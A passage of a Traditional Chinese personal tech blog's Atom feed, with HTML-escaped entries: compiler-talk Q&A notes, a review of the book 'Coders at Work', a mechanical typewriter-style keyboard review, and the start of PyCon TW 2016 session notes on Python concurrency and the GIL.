&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;目前遇到客戶反應的問題  &lt;ul&gt;
&lt;li&gt;回傳回去的 object file 沒有做版本控制，導致無法客戶拿某個時期的 object file 來做測試。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Q&amp;amp;A&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;有支援 &lt;a href="https://en.wikipedia.org/wiki/Profile-guided_optimization"&gt;Profile-guided optimization&lt;/a&gt; 嗎？  &lt;ul&gt;
&lt;li&gt;目前沒有支援  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;為什麼剛剛說 opentuner 是來亂的？  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://opentuner.org/"&gt;opentuner&lt;/a&gt; 沒有解決任何問題，只是提供一個優雅的方式來把 run, kill, clean, build scirpts。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;客戶使用你們的 compiler 不會造成 debug 很困難嗎？  &lt;ul&gt;
&lt;li&gt;會，這也是我們目前被罵的地方。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;你們收費怎麼算？  &lt;ul&gt;
&lt;li&gt;很貴，因為我們的客戶幾乎都是大公司，但因為很貴，所以也很難談。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Compiler"></category></entry><entry><title>《編程人生》(Coders at Work)</title><link href="https://blog.m157q.tw/posts/2016/06/16/coders-at-work/" rel="alternate"></link><published>2016-06-16T20:54:00+08:00</published><updated>2016-06-16T20:54:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-06-16:posts/2016/06/16/coders-at-work/</id><summary type="html">&lt;h1&gt;前言&lt;/h1&gt;
&lt;p&gt;其實這篇算重寫一次...&lt;br /&gt;
之前其實有寫好了，&lt;br /&gt;
而且當時已經拖了一個多月，&lt;br /&gt;
但是因為跟 git 還是不夠熟，&lt;br /&gt;
在為了新的 Makefile 做一些新的實驗時，&lt;br /&gt;
不小心把 git repo 搞炸了，&lt;br /&gt;
所以只好重新 clone...&lt;br /&gt;
然後就拖到了現在，&lt;br /&gt;
算起來離看完這本書過了三個月了，&lt;br /&gt;
只好憑印象寫一下心得，&lt;br /&gt;
剛好順便復習一下裡頭的內容。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;心得&lt;/h1&gt;
&lt;p&gt;原文是這本：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.codersatwork.com/"&gt;Coders at Work: Reflections on the Craft of Programming&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;於 2009/09/16 出版  &lt;/p&gt;
&lt;p&gt;但我看的是在若水堂買的簡中翻譯版，分成上下冊兩本：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.waterlike.com.tw/bookdata.asp?NO=TP3C153043"&gt;編程人生：15 位軟件先驅訪談錄 (上卷)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.waterlike.com.tw/bookdata.asp?NO=TP3C153044"&gt;編程人生：15 位軟件先驅訪談錄 (下卷)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;於 2015/01 出版 （竟然隔了 5 年多才被翻譯，個人覺得有點罕見。）  &lt;/p&gt;
&lt;p&gt;作者總共訪談了 15 位在資訊界都有著極大貢獻的人物，&lt;br /&gt;
上冊的 8 位：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第 1 篇 &lt;a href="http://www.codersatwork.com/jamie-zawinski.html"&gt;Jamie Zawinski&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Mozilla 計劃的先驅及主要貢獻者之一  &lt;/li&gt;
&lt;li&gt;XScreenSaver 的 Contributor  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 2 篇 &lt;a href="http://www.codersatwork.com/brad-fitzpatrick.html"&gt;Brad Fitzpatrick&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;LiveJournal, Memcached, OpenID 的 Owner  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 3 篇 &lt;a href="http://www.codersatwork.com/douglas-crockford.html"&gt;Douglas Crockford&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;"JavaScript: The Good Parts" 的作者  &lt;/li&gt;
&lt;li&gt;Yahoo! 資深 JavaScript 架構師  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 4 篇 &lt;a href="http://www.codersatwork.com/brendan-eich.html"&gt;Brendan Eich&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;JavaScript 之父  &lt;/li&gt;
&lt;li&gt;Mozilla 計劃的共同發起人，當過 Mozilla 的 CTO 和 CEO  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 5 篇 &lt;a href="http://www.codersatwork.com/joshua-bloch.html"&gt;Joshua Bloch&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;"Effective Java" 的作者  &lt;/li&gt;
&lt;li&gt;曾任職於 Sun 和 Google，在 Google 是擔任 Chief Java Architect  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 6 篇 &lt;a href="http://www.codersatwork.com/joe-armstrong.html"&gt;Joe Armstrong&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Erlang 之父  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 7 篇 &lt;a href="http://www.codersatwork.com/simon-peyton-jones.html"&gt;Simon Peyton Jones&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Haskell Contributor, Glasgow Haskell Compiler (GHC) 的主力開發者和架構師  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 8 篇 &lt;a href="http://www.codersatwork.com/peter-norvig.html"&gt;Peter Norvig&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Director of Research at Google  &lt;/li&gt;
&lt;li&gt;co-author, with Stuart Russell, of "Artificial Intelligence: A Modern Approach"  &lt;/li&gt;
&lt;li&gt;was head of the Computational Sciences Division (now the Intelligent Systems Division) at NASA Ames Research Center  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下冊的 7 位：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第 1 篇 &lt;a href="http://www.codersatwork.com/guy-steele.html"&gt;Guy Steele&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Guy_L._Steele_Jr."&gt;https://en.wikipedia.org/wiki/Guy_L._Steele_Jr.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;寫過非常多種程式語言  &lt;/li&gt;
&lt;li&gt;參與過許多程式語言的制定過程，是 Common Lisp 和 Scheme 的作者之一，也參與了 Fortran, C, ECMAScript 的標準制定過程。  &lt;/li&gt;
&lt;li&gt;曾被 Bill Joy 邀請加入 Sun 幫忙訂定 Java 的標準。  &lt;/li&gt;
&lt;li&gt;ACM Grace Murray Hopper Award 1988 年得主。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 2 篇 &lt;a href="http://www.codersatwork.com/dan-ingalls.html"&gt;Dan Ingalls&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Daniel_Henry_Holmes_Ingalls,_Jr."&gt;https://en.wikipedia.org/wiki/Daniel_Henry_Holmes_Ingalls,_Jr.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;物件導向先驅之一  &lt;/li&gt;
&lt;li&gt;對於 Smalltalk 程式語言貢獻極多，1976 年設計了 bytecoded virtual machine 使得 Smalltalk 得以實作。  &lt;/li&gt;
&lt;li&gt;ACM Grace Murray Hopper Award 1984 年得主。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 3 篇 &lt;a href="http://www.codersatwork.com/l-peter-deutsch.html"&gt;L Peter Deutsch&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/L_Peter_Deutsch"&gt;https://en.wikipedia.org/wiki/L_Peter_Deutsch&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;11 歲開始寫程式，過沒多久就開始在 MIT 閒晃，在 PDP-1 上實作 Lisp，和比自己年紀大了快兩倍的 MIT Hackers 一起寫程式。（有出現在&lt;a href="http://www.books.com.tw/products/0010548392"&gt;《黑客列傳：電腦革命俠客誌》（Hackers: Heroes of the Computer Revolution）&lt;/a&gt; 這本書裏面）  &lt;/li&gt;
&lt;li&gt;在 UC Berkeley 當大二生的時候，他參與了 Project Genie（最早的 minicomputer-based timesharing system 之一），他負責撰寫這個作業系統大部分的 kernel。  &lt;/li&gt;
&lt;li&gt;在 Project Genie 商業化失敗後，他到了 Xerox PARC 這間公司，負責 Interlisp system 和 Smalltalk virtual machine，協助 JIT compilation 技術的部份。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 4 篇 &lt;a href="http://www.codersatwork.com/ken-thompson.html"&gt;Ken Thompson&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Ken_Thompson"&gt;https://en.wikipedia.org/wiki/Ken_Thompson&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;MULTICS, UNIX, B programming language, Plan 9, UTF-8, golang  &lt;/li&gt;
&lt;li&gt;1983 年圖靈獎得主之一 （和 Dennis Ritchie 共同獲得）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 5 篇 &lt;a href="http://www.codersatwork.com/fran-allen.html"&gt;Fran Allen&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Frances_E._Allen"&gt;https://en.wikipedia.org/wiki/Frances_E._Allen&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;2006 年圖靈獎得主  &lt;/li&gt;
&lt;li&gt;在 IBM 待了 45 年，負責一系列的編譯器相關的專案。  &lt;/li&gt;
&lt;li&gt;似乎是這本書的受訪者裡頭唯一一位女性  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 6 篇 &lt;a href="http://www.codersatwork.com/bernie-cosell.html"&gt;Bernie Cosell&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;參與了 ARPANET 早期使用的 IMP (Interface Message Processors) 的實作。  &lt;/li&gt;
&lt;li&gt;在 BBN 待了 26 年，基本上裡面的專案都有碰，因其精湛的除錯技巧，而贏得了 Master debugger 跟 Fixer 的稱號。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 7 篇 &lt;a href="http://www.codersatwork.com/donald-knuth.html"&gt;Donald Knuth&lt;/a&gt; （高德納）  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Donald_Knuth"&gt;https://en.wikipedia.org/wiki/Donald_Knuth&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;"The Art of Computer Programming" 一書的作者  &lt;/li&gt;
&lt;li&gt;TeX, METAFONT  &lt;/li&gt;
&lt;li&gt;1971 年 Grace Murray Hopper Award 得主、1974 年圖靈獎得主、1995 年 John von Neumann Medal 得主、...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因為作者 Peter Siebel 本身也是會寫程式的人，&lt;br /&gt;
然後對整個圈子的生態和歷史也很瞭解，&lt;br /&gt;
所以問的許多問題都還蠻犀利的，&lt;br /&gt;
除了問每一位受訪者共同的問題，像是：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;「你對其他工程師推薦哪些書籍？」  &lt;/li&gt;
&lt;li&gt;「你有看完 The Art of Programming 嗎？你對這本書的想法是什麼？」  &lt;/li&gt;
&lt;li&gt;「你覺得自己應該算是下列哪一項：藝術家？工程師？建築師？專家？程式設計師？」  &lt;/li&gt;
&lt;li&gt;「你覺得數學對於寫程式有沒有幫助？是不是每一位寫程式的人都要會的？」  &lt;/li&gt;
&lt;li&gt;「在你寫程式的生涯中，遇到最棘手的 Bug 是哪類型的？你當時怎麼解決的？」  &lt;/li&gt;
&lt;li&gt;「如果讓你重選一次，你還會寫程式嗎？」（我記得應該有這問題，沒有的話就是我記錯了。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中也有針對受訪者詢問不同的軟體工程相關問題：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;「你認為 Pair Programming 對於寫程式有沒有幫助？」  &lt;/li&gt;
&lt;li&gt;「你對 Agile Programming, Extreme Programming 和 Waterfall 有什麼看法？」  &lt;/li&gt;
&lt;li&gt;「你認為 unit testing 是不是必須的？」  &lt;/li&gt;
&lt;li&gt;「你對於 Marting Fowler 的《人月神話》和《沒有銀彈》有什麼看法？」  &lt;/li&gt;
&lt;li&gt;「你開發一個程式的時候是習慣 Top-down 還是 Bottom-up？」  &lt;/li&gt;
&lt;li&gt;「接手一個程式的時候你是傾向重寫它還是瞭解之前的人在寫什麼然後試圖修改它？」  &lt;/li&gt;
&lt;li&gt;「你有寫文件的習慣嗎？你覺得寫文件的重要性如何？」  &lt;/li&gt;
&lt;li&gt;「你對 Code Review 有什麼看法？你覺得對開發有幫助嗎？」  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也會針對受訪者問個別的問題：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Jamin Zawinski  &lt;ul&gt;
&lt;li&gt;Netscape 和 Firefox 當時的狀況  &lt;/li&gt;
&lt;li&gt;Lisp  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Brad Fitzpatrick  &lt;ul&gt;
&lt;li&gt;LiveJournal, Memcached, OpenID, Go  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Douglas Crockford  &lt;ul&gt;
&lt;li&gt;JavaScript, JSON, JSLint, JSMin, FORTRAN  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Brendan Eich  &lt;ul&gt;
&lt;li&gt;JavaScript 的誕生、設計過程、優缺點以及未來有哪些計劃  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Joshua Bloch  &lt;ul&gt;
&lt;li&gt;Java 還有關於 SUN 和在 Google 的經驗  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Joe Armstrong  &lt;ul&gt;
&lt;li&gt;Erlang 的開發過程和未來的想法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Simon Peyton Jones  &lt;ul&gt;
&lt;li&gt;Haskell 和開發 GHC 的經驗談  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Peter Norvig  &lt;ul&gt;
&lt;li&gt;NASA, AI, Google  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Guy Steele  &lt;ul&gt;
&lt;li&gt;（忘了）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dan Ingalls  &lt;ul&gt;
&lt;li&gt;（忘了）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LPeter Deutsch  &lt;ul&gt;
&lt;li&gt;（忘了）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ken Thompson  &lt;ul&gt;
&lt;li&gt;針對 UNIX 的開發還有問一些 Denis Ritchie 的事  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fran Allen  &lt;ul&gt;
&lt;li&gt;（忘了）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bernie Cosell  &lt;ul&gt;
&lt;li&gt;（忘了）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Donald Knuth  &lt;ul&gt;
&lt;li&gt;問 LaTeX 還有 The Art of Programming  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而且由於受訪者的領域和慣用語言不盡相同，&lt;br /&gt;
所以每個人的想法也都不太一樣，&lt;br /&gt;
但也沒有說誰對誰錯的問題，&lt;br /&gt;
每個人都因為自己的成長過程和人格特質而對寫程式這件事有不同的見解，&lt;br /&gt;
我想這也證明了這個圈子的多元性。  &lt;/p&gt;
&lt;p&gt;但其中也有一致認同的地方，&lt;br /&gt;
像是：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;「數學雖然不是必須的，但對寫程式有一定程度以上的幫助。」  &lt;/li&gt;
&lt;li&gt;「寫程式是很花時間及講求經驗的」  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我覺得如果有個把作者問所有受訪者的共同問題和回答整合起來的筆記應該會很有趣。  &lt;/p&gt;
&lt;p&gt;整本書看下來讓我覺得就像是看著作者和受訪者在眼前對談，&lt;br /&gt;
甚至從文字中的描述我就能感受到每位受訪者不同的風格，&lt;br /&gt;
所以我選擇慢慢品嚐，然後就花了兩個月才看完。Orz&lt;br /&gt;
不知道為啥我看程式相關的書籍的速度都特別慢...&lt;br /&gt;
之後應該會選擇看快一點吧，&lt;br /&gt;
反正正常看也是會忘，&lt;br /&gt;
看太慢也是會忘，&lt;br /&gt;
那倒不如看快一點還有機會多看幾次。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.codersatwork.com/"&gt;Coders at Work: Reflections on the Craft of Programming&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Coders_at_work"&gt;Coders at work - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/PARC_(company)"&gt;PARC (company) - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/ruanyf/status/743420600840912898"&gt;ruanyf on Twitter: "Erlang语言的发明者Armstrong回忆说：“刚进公司时，我喜欢帮别人Debug，同事会买杯啤酒感谢我。后来，我们就用啤酒表示bug的难度，这个是两杯啤酒bug，那个是三杯啤酒bug……” #书摘"&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Programmer"></category><category term="Book"></category></entry><entry><title>雷斯特 68 鍵凱華青軸機械式打字機鍵盤</title><link href="https://blog.m157q.tw/posts/2016/06/09/lexking-typewriter-68-keys-blue-switch-mechanical-keyboard/" rel="alternate"></link><published>2016-06-18T16:13:00+08:00</published><updated>2016-06-18T16:13:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-06-09:posts/2016/06/09/lexking-typewriter-68-keys-blue-switch-mechanical-keyboard/</id><summary type="html">&lt;p&gt;&lt;strong&gt;當程式猿變成了打字猿（？）&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;&lt;img alt="keybaord 2" src="/files/lexking-typewriter-68-keys-blue-switch-mechanical-keyboard/keyboard2.jpg" /&gt;&lt;br /&gt;
&lt;img alt="keybaord 3" src="/files/lexking-typewriter-68-keys-blue-switch-mechanical-keyboard/keyboard3.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;商品連結：&lt;a href="https://uccu.cool3c.com/projects/205"&gt;https://uccu.cool3c.com/projects/205&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;先說結論：「可遠觀而不可褻玩焉。」 XDDD&lt;br /&gt;
基本上只建議把這把拿來當玩具或者收藏用，&lt;br /&gt;
如果是要拿來當生產力工具、追求手感或是買第一把機械式鍵盤的人，&lt;br /&gt;
非常不推薦買這把，多花一點點錢，你可以買到更好的手感。&lt;br /&gt;
（稍微有點概念的應該都是看到凱華軸就不會買了吧 XD）&lt;br /&gt;
Ducky One 80% 的手感比這把好上許多，價錢其實差不多。&lt;br /&gt;
覺得專心把打字機鍵帽弄好只賣鍵帽可能還比較有搞頭？  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;個人認為的優缺點&lt;/h2&gt;
&lt;p&gt;優點：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;吸睛指數極高，打字機復古風格，背光呼吸燈炫炮。（連公司都有女同事說想買這把了XD）  &lt;ul&gt;
&lt;li&gt;&lt;img alt="keyboard 4" src="/files/lexking-typewriter-68-keys-blue-switch-mechanical-keyboard/keyboard4.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;英文鍵帽為懸浮鍵帽，所以非常好拆，不需要拔鍵器，但有種很容易噴掉的感覺。（中文鍵帽則需要拔鍵器。）  &lt;/li&gt;
&lt;li&gt;沒有鐵板，但我打起來不會晃，重量極輕。(但對習慣機械式鍵盤有鐵板的人來說這是個缺點）  &lt;/li&gt;
&lt;li&gt;無邊框，好清理，平常應該只要拿來抖一抖就可以了，感覺應該不太容易卡灰塵，頂多鍵帽用久了得擦拭這樣。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;缺點：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作工粗糙，鍵帽幾乎都沒磨乾淨，應該是因為廠商趕工的關係。然後鍵帽也有破損。  &lt;ul&gt;
&lt;li&gt;&lt;img alt="keyboard 6" src="/files/lexking-typewriter-68-keys-blue-switch-mechanical-keyboard/keyboard6.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;手感頗怪，打起來的感覺是中間 asdf 那列凸起來，然後上下 qwer 跟 zxcv 兩列下滑，有種小山坡的感覺。  &lt;/li&gt;
&lt;li&gt;圓形鍵帽的面積比傳統方形的面積還大，大概是那個金屬外框的關係，所以很容易錯按相鄰的鍵。  &lt;/li&gt;
&lt;li&gt;我拿到的這把的 T 鍵比旁邊的 R 和 Y 鍵還低了一些，位置怪怪的。  &lt;/li&gt;
&lt;li&gt;中文鍵帽做的太緊，而且不知道是鬆緊不一還是軸的粗細有差，導致中文鍵帽會一高一低，完美詮釋了「橫看成嶺側成峰，遠近高低各不同。」，英文鍵帽倒沒這問題。（所以中文鍵帽記得不要塞太緊，不然用拔鍵器拔的時候，如果一個沒拔好只拔到一邊的話，會連底下的凱華青軸都拔起一邊來，得把軸用力塞回去鍵盤裡。）  &lt;ul&gt;
&lt;li&gt;&lt;img alt="keyboard 5" src="/files/lexking-typewriter-68-keys-blue-switch-mechanical-keyboard/keyboard5.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;隨中文鍵帽一起附贈的拔鍵器無法拔長鍵，要試著夾窄的部份的時候，只能夾到一邊，因為拔鍵器太短，最後是拿我買 Ducky One 80% 時拿到的 Ducky 拔鍵器來拔。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;個人感想&lt;/h2&gt;
&lt;p&gt;反正這把在 &lt;code&gt;Key_Mou_Pad&lt;/code&gt; 版我是覺得會被噴到體無完膚啦，&lt;br /&gt;
當初本來就覺得這把是收藏兼玩具性質 XD  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;拿到後證明當初的想法果然沒錯  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我是拿到之後才發現有背光，&lt;br /&gt;
當初下訂的時候其實沒有特別注意有沒有背光。  &lt;/p&gt;
&lt;p&gt;然後打起來的聲音沒有一般的青軸清脆&lt;br /&gt;
該說中國製的凱華青軸不意外嗎？&lt;br /&gt;
但換回傳統的方形鍵帽感覺有好一點，&lt;br /&gt;
但我個人還是覺得跟我平常自己在用的 KBT Pure Pro 青軸，&lt;br /&gt;
還有跟友人借來打過的 Filco Ninja 青軸差蠻多的。&lt;br /&gt;
然後用打字機的英文鍵帽打起來絕對不是打字機的聲音 XD  &lt;/p&gt;
&lt;p&gt;然後因為按鍵位置有些差距，&lt;br /&gt;
還有比較容易按錯相鄰鍵帽的關係，&lt;br /&gt;
拿來打 typeracer 大概只有 70 wpm 上下，&lt;br /&gt;
大概比平常用 KBT Pure Pro 青軸的速度慢上 10 wpm，&lt;br /&gt;
嘛 反正傳統打字機本來就不能打太快嘛 (?)  &lt;/p&gt;
&lt;p&gt;然後有個功能叫作「按鍵速度調節」，&lt;br /&gt;
還分成 20, 40, 60 Charcters/Second。&lt;br /&gt;
原本不知道這是什麼，後來研究了一下才知道，&lt;br /&gt;
這功能是用來調整長按單一個鍵的時候，該鍵的訊號輸出速度。&lt;br /&gt;
比如說一直按著空白鍵時，鍵盤送出空白鍵的訊號的速度。&lt;br /&gt;
我自己是用 Fn+E 調到了 40 chars/sec，&lt;br /&gt;
因為調到 60 的話，用 backspace 刪除的速度會刪的太快。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;然後我發現同個速度底下，長按空白鍵送出的速度比長按 backspace 鍵刪除的速度還慢許多。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這把之後應該是放在家裡，有回家再拿來用的概念 XD&lt;br /&gt;
恥力夠的人可以選擇在假日帶到咖啡館使用，吸引路人的目光（？）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;補充&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;用 PET 包裝的悲劇中文鍵帽  &lt;ul&gt;
&lt;li&gt;&lt;img alt="keyboard 1" src="/files/lexking-typewriter-68-keys-blue-switch-mechanical-keyboard/keyboard1.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;實際使用情況  &lt;ul&gt;
&lt;li&gt;&lt;img alt="keyboard 7" src="/files/lexking-typewriter-68-keys-blue-switch-mechanical-keyboard/keyboard7.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Mechanical Keyboard"></category><category term="Lexking"></category><category term="Blue Switch"></category></entry><entry><title>PyCon TW 2016</title><link href="https://blog.m157q.tw/posts/2016/06/03/pycon-tw-2016/" rel="alternate"></link><published>2016-06-05T23:22:00+08:00</published><updated>2016-06-05T23:22:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-06-03:posts/2016/06/03/pycon-tw-2016/</id><summary type="html">&lt;p&gt;Really appreciate &lt;a href="http://eldarion.com/"&gt;eldarion&lt;/a&gt; gave me the free sponsored ticket or I could not attend this biggest annual Python event in Taiwan.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://tw.pycon.org/2016/"&gt;官網&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackfoldr.org/pycontw2016"&gt;官方共筆&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gitter.im/pycontw/2016"&gt;官方聊天室&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.flickr.com/photos/pycon_tw_2016/"&gt;官方相簿&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/channel/UCHLnNgRnfGYDzPCCH8qGbQw"&gt;直播頻道&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 1 (2016/06/03 Fri)&lt;/h1&gt;
&lt;hr /&gt;
&lt;h2&gt;Keynote: The world after tomorrow by au（唐鳳）&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;與 Python 第一次接觸：2003 年，在台灣，Perl, Python, PHP 三個沒有大公司支撐的語言辦了個 Conf，沒想到反應熱烈，成為 OSDC.tw 的前身，直到 2014 年 OSDC 停辦。  &lt;/li&gt;
&lt;li&gt;Perl 5：很多設計都是從 Python 的 pep 抄來  &lt;/li&gt;
&lt;li&gt;用 Open Source 參與公民社會：318, g0v  &lt;/li&gt;
&lt;li&gt;報導者：開源媒體  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;R2: Strategies for concurrency and parallelism in Python by 洪鈺庭&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Synchronous Model  &lt;ul&gt;
&lt;li&gt;一次執行一個 task  &lt;/li&gt;
&lt;li&gt;最常用，最簡單，最直覺  &lt;/li&gt;
&lt;li&gt;Demo  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;voice.RSS.TexttoSpeechAPI&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;並沒有用到 concurrency 的概念  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Multi-threading  &lt;ul&gt;
&lt;li&gt;不一樣的 thread 可以 share 同一個 memory space  &lt;/li&gt;
&lt;li&gt;create 一個 queue 再從 queue 拿出來  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GIL in Python  &lt;ul&gt;
&lt;li&gt;同一個時間只會讓一個 thread 執行  &lt;/li&gt;
&lt;li&gt;因為有些 Lib 不是 thread safe，所以直接做限制  &lt;/li&gt;
&lt;li&gt;不是所有 Python 的實作都有 GIL, CPython 有，但像 Jython 和 IronPython 就沒有。  &lt;/li&gt;
